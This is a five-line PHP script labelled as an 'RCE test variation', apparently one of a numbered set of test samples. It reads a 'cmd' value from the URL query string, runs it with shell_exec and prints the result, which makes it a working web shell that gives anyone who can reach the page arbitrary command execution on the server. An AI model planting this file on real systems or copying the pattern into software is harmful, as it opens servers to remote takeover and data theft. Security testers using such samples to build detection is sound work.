<?php
// RCE test variation #794
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>